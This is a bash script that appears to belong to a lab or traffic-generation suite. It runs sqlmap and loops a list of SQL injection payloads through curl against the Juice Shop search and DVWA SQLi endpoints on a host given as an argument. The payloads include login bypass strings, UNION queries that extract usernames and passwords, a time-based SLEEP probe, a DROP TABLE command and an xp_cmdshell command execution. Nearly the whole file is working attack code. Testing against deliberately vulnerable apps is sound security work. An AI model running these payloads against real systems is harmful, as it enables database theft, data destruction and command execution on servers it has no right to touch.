#!/bin/bash
# SQL Injection payload suite
# Tools: sqlmap, curl
# Targets: Juice Shop search endpoint, DVWA SQLi endpoint
# Estimated duration: 2-5 minutes
set -euo pipefail

TARGET="${1:?Usage: 01-sqli.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] SQL Injection suite against ${TARGET}"
echo ""

# --- sqlmap automated tests ---
echo "[+] Running sqlmap against Juice Shop search API..."
sqlmap --batch --level=1 --risk=1 \
  -u "${BASE}/juice-shop/rest/products/search?q=test" \
  --timeout=10 --retries=1 --threads=3 \
  --output-dir="${TGEN_RESULTS_DIR:-/tmp}/sqlmap-juice" ||
  echo "WARN: sqlmap juice-shop scan returned non-zero"

echo ""
echo "[+] Running sqlmap against DVWA SQLi endpoint..."
sqlmap --batch --level=1 --risk=1 \
  -u "${BASE}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --timeout=10 --retries=1 --threads=3 \
  --output-dir="${TGEN_RESULTS_DIR:-/tmp}/sqlmap-dvwa" ||
  echo "WARN: sqlmap dvwa scan returned non-zero"

echo ""

# --- Direct curl-based SQLi payloads ---
echo "[+] Sending direct SQLi payloads via curl..."

PAYLOADS=(
  "' OR '1'='1"
  "' OR '1'='1' --"
  "' UNION SELECT NULL,NULL,NULL --"
  "1; DROP TABLE users --"
  "admin'--"
  "' OR 1=1#"
  "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--"
  "' UNION SELECT username,password FROM users--"
  "1 OR 1=1"
  "'; EXEC xp_cmdshell('whoami')--"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}'''))")

  echo "  Payload: ${payload}"

  # Juice Shop search
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/juice-shop/rest/products/search?q=${encoded}" \
    --max-time 10) || code="ERR"
  echo "    juice-shop/search -> HTTP ${code}"

  # DVWA SQLi
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/dvwa/vulnerabilities/sqli/?id=${encoded}&Submit=Submit" \
    --max-time 10) || code="ERR"
  echo "    dvwa/sqli          -> HTTP ${code}"
done

echo ""
echo "[*] SQL Injection suite complete"
